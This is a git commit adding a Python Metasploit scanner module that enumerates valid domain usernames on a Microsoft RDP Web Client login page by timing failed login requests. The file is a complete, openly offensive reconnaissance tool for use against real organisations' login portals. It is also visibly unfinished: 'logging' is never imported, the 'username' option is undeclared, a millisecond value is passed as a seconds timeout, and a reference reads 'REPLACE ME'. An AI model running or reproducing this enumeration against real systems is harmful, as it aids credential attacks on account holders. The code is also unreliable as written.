0c2411f064ed6ff5453d171d34d52411d5e78de3
k0pak4 <matthew.eric.dunn@gmail.com>
2020-12-22 23:34:52 -0500

    First pass at RDP Web Client module that can enumerate usernames against a domain

---
+++ modules/auxiliary/scanner/http/rdp_web_login.py
@@ -0,0 +1,75 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# standard modules
+from metasploit import module
+
+# extra modules
+dependencies_missing = False
+try:
+    import requests
+except ImportError:
+    dependencies_missing = True
+
+
+# Metasploit Metadata
+metadata = {
+    'name': 'Microsoft RDP Web Client Login Enumeration',
+    'description': '''
+        Enumerate valid usernames against a Microsoft RDP Web Client by performing a timing based check against the provided username.
+    ''',
+    'authors': [
+        'Matthew Dunn'
+    ],
+    'date': '2020-12-23',
+    'license': 'MIT',
+    'references': [
+        {'type': 'url', 'ref': 'REPLACE ME'},
+    ],
+    'type': 'single_scanner',
+    'options': {
+        'targeturi': {'type': 'string', 'description': 'The base path to the RDP Web Client install',
+                      'required': True, 'default': '/RDWeb/Pages/en-US/login.aspx'},
+        'rhost': {'type': 'address', 'description': 'Host to target', 'required': True, 'default': None},
+        'rport': {'type': 'port', 'description': 'Port to target', 'required': True, 'default': 443},
+        'domain': {'type': 'string', 'description': 'The target AD domain', 'required': True, 'default': None},
+        'cutoff_time': {'type': 'number',
+                        'description': 'Minimum milliseconds for response to consider username invalid',
+                        'required': True, 'default': 1000}
+    }
+}
+
+
+def check_username(rhost, rport, targeturi, domain, username, cutoff_time):
+    """Check a single username against the RDWeb Client
+    The cutoff_time is used to specify the amount of milliseconds where a
+    response should consider the username invalid."""
+
+    url = f'https://{rhost}:{rport}/{targeturi}'
+    body = f'DomainUserName={domain}%5C{username}&UserPass=incorrect' 
+    session = requests.Session()
+    try:
+        request = session.post(url, data=body, timeout=cutoff_time)
+        if request.status_code == 200:
+            module.log(f'Username {domain}\{username} is valid! Response received in {request.elapsed} milliseconds',
+                       level='good')
+        else:
+            module.log(f'Username {domain}\{username} is invalid! No response received in {cutoff_time} milliseconds',
+                       level='error')
+    except requests.exceptions.RequestException as e:
+        module.log('{}'.format(e), level='error')
+        return
+
+
+def run(args):
+    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
+    if dependencies_missing:
+        logging.error('Module dependency (requests) is missing, cannot continue')
+        return
+
+    check_username(args['rhost'], args['rport'], args['targeturi'],
+                   args['domain'], args['username'], args['cutoff_time'])
+
+
+if __name__ == '__main__':
+    module.run(metadata, run)
